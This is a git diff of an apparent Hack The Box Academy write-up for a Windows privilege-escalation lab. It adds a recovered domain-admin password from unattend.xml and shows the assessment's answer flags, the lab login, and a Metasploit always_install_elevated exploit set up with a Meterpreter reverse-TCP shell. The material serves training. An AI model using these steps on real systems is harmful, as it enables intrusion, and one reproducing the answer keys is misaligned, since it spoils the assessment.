@@ -7,7 +7,16 @@ Enumerate the host fully and attempt to escalate privileges to administrator/SYS
 
 ## Questions
 RDP to 10.129.43.33 (ACADEMY-WINLPE-SKILLS2-WS), with user `htb-student` and password `HTB_@cademy_stdnt!`
-1. Find left behind cleartext credentials for the iamtheadministrator domain admin account. **Answer:**
+1. Find left behind cleartext credentials for the iamtheadministrator domain admin account. **Answer: Inl@n3fr3ight_sup3rAdm1n!**
+   - Look for unattended installation files:
+          ```cmd
+          C:\>dir /s /b unattend.xml
+          C:\Windows\Panther\unattend.xml
+          ```
+   - Read the credential:
+          ```cmd
+          C:\> notepad C:\Windows\Panther\unattend.xml
+          ```
 2. Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop **Answer: el3vatEd_1nstall$_v3ry_r1sky**
    - Generate meterpreter shell payload and move it to the shared drive:
         ```shellsession
@@ -84,6 +93,9 @@ RDP to 10.129.43.33 (ACADEMY-WINLPE-SKILLS2-WS), with user `htb-student` and pas
         /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
         [*] 10.129.43.33 - 239 exploit checks are being tried...
         [+] 10.129.43.33 - exploit/windows/local/always_install_elevated: The target is vulnerable.
+        
+        <SNIP>
+
         [msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/always_install_elevated
         [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
         [msf](Jobs:0 Agents:1) exploit(windows/local/always_install_elevated) >> set LHOST 10.10.15.142
